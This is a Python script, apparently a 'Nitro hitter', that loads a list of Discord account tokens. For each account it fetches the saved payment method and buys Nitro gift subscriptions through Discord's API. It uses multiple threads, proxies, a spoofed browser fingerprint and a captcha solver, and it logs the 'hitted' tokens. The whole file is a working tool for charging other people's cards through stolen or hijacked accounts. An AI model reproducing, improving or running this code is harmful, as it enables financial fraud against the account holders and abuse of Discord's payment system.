import os
import requests
from threading import Thread
from colorama import Fore, Style
from pystyle import Write, Colors
from solver import *
import requests
import json
from json import load
import tls_client
import uuid
from solver import *
from uuid import uuid4

session = tls_client.Session(
    client_identifier="chrome112"
)

textP = """
███╗   ██╗██╗████████╗██████╗  ██████╗     ██╗  ██╗██╗████████╗████████╗███████╗██████╗ 
████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗    ██║  ██║██║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗
██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║    ███████║██║   ██║      ██║   █████╗  ██████╔╝
██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║    ██╔══██║██║   ██║      ██║   ██╔══╝  ██╔══██╗
██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝    ██║  ██║██║   ██║      ██║   ███████╗██║  ██║
╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝     ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝
"""
textP2 = """
( ^ ) Credits: response
( ! ) Info: this is attached payment method based [ in-tokens ]
"""
Write.Print(textP, color=Colors.red_to_yellow, interval=0)
Write.Print(textP2, color=Colors.cyan_to_blue, interval=0.004)

ty = Write.Input("\n( * ) What do you want to purchase through these tokens? (boost/basic): ", interval=0, color=Colors.blue_to_green)
threads = Write.Input("\n( * ) Enter the number of threads: ", interval=0, color=Colors.blue_to_green)
yn = Write.Input("\n( * ) Do you want to turn the captcha solving on? ( capsolver support ) (y/n): ", interval=0, color=Colors.blue_to_green)

class Purchaser:
    def __init__(self, token: str, proxy=None):
        self.token = token
        self.proxy = proxy

    def purchaseNitro(self, type):
        idUrl = 'https://discord.com/api/v9/users/@me/billing/payment-sources'
        idHrd = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": self.token,
            "Referer": "https://discord.com/channels/@me",
            "Sec-Ch-Ua": "\"Not A(Brand\";v=\"99\", \"Microsoft Edge\";v=\"121\", \"Chromium\";v=\"121\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Europe/Budapest",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjEuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjEuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjYzNzk2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
        }
        respx = session.get(idUrl, headers=idHrd, proxy=self.proxy)
        try:
            jsonfmt = respx.json()
            ala = jsonfmt[0]
            purId = ala["id"]
            print(f"{Fore.BLUE}( # ) Fetched Purchase Id: {purId}, token: {self.token[:23]}....")
        except Exception as e:
            print(f"{Fore.RED}( - ) Unable to fetch Purchase Id, Error: {e}")
            return "fail"
        config = json.load(open('input/config.json'))
        key = config["AuthorizationSettings"]["CapSolverKey"]
        if yn == 'y':
          captchae = solve(key,"capsolver") # change the service if you want :D
          if not captchae.get('solved'):
            captcha_excp = captchae.get('excp')
            print(f"{Fore.RED}( ^ ) Unable to solve captcha, {captcha_excp}")
            return
          gcap_resp = captchae.get('gcap')
        else:
          gcap_resp = None
        purUrl = 'https://discord.com/api/v9/store/skus/978380684370378762/purchase'
        purchaseHeaders = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": self.token,
            "Content-Length": "331",
            "Content-Type": "application/json",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me",
            "Sec-Ch-Ua": "\"Not A(Brand\";v=\"99\", \"Microsoft Edge\";v=\"121\", \"Chromium\";v=\"121\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
            "X-Context-Properties": "e30=",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Europe/Budapest",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjEuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjEuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjYzNzk2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
        }

        if str(type).lower() == "basic":
            payloads = {
                "gift": True,
                "sku_subscription_plan_id": "978380692553465866",
                "gateway_checkout_context": None,
                "load_id": str(uuid.uuid4()),
                "payment_source_id": str(purId),
                "payment_source_token": None,
                "expected_amount": '299',
                "expected_currency": "usd",
                "gift_style": '4',
                "purchase_token": str(uuid.uuid4()),
                "captcha_key": gcap_resp
            }
            purUrl = purUrl
        elif str(type).lower() == "boost":
            payloads = {
                "gift": True,
                "sku_subscription_plan_id": "511651880837840896",
                "gateway_checkout_context": None,
                "load_id": str(uuid.uuid4()),
                "payment_source_id": str(purId),
                "payment_source_token": None,
                "expected_amount": '999',
                "expected_currency": "usd",
                "gift_style": '4',
                "purchase_token": str(uuid.uuid4()),
                "captcha_key": gcap_resp
            }
            purUrl = 'https://discord.com/api/v9/store/skus/521847234246082599/purchase'
        als = requests.post(purUrl, headers=purchaseHeaders, json=payloads, proxies=self.proxy)
        if not als.status_code == 200:
            print(f"{Fore.RED}( - ) Unable to purchase, Token: {self.token[:23]}...., PurchaseId: {purId}, Message: {als.text}.")
            with open('output/unsuccessfullToks.txt', 'a') as file:
                file.write(self.token+'\n')
        else:
            print(f"{Fore.GREEN}( + ) Purchased nitro {type}, Token: {self.token[:23]}...., PurchaseId: {purId}")
            with open('output/hittedTokens.txt', 'a') as file:
                file.write(self.token+'\n')


def purchase_wrapper(token, type, proxy):
    runInst = Purchaser(token, proxy)
    runInst.purchaseNitro(type)


def load_tokens():
    tokens = []
    file_path = os.path.join("input", "tokens.txt")
    if not os.path.exists(file_path):
        print(f"{Fore.RED}( - ) Tokens file not found.")
        return []

    with open(file_path, "r") as file:
        for line in file:
            tokens.append(line.strip())
    return tokens


def load_proxies():
    proxies = []
    file_path = os.path.join("input", "proxies.txt")
    if not os.path.exists(file_path):
        print(f"{Fore.RED}( - ) Proxies file not found, setting proxy as None.")
        return None

    with open(file_path, "r") as file:
        for line in file:
            proxies.append(line.strip())
    return proxies


def main():
    tokens = load_tokens()
    proxies = load_proxies()
    
    if not tokens:
        print(f"{Fore.RED}( - ) No tokens found in the file.")
        return

    type = ty
    threads_count = int(threads)

    if proxies:
        for token in tokens:
            for proxy in proxies:
                for i in range(threads_count):
                    thread = Thread(target=purchase_wrapper, args=(token, type, {"https": proxy}))
                    thread.start()
    else:
        for token in tokens:
            for i in range(threads_count):
                thread = Thread(target=purchase_wrapper, args=(token, type, None))
                thread.start()


if __name__ == "__main__":
    main()
input()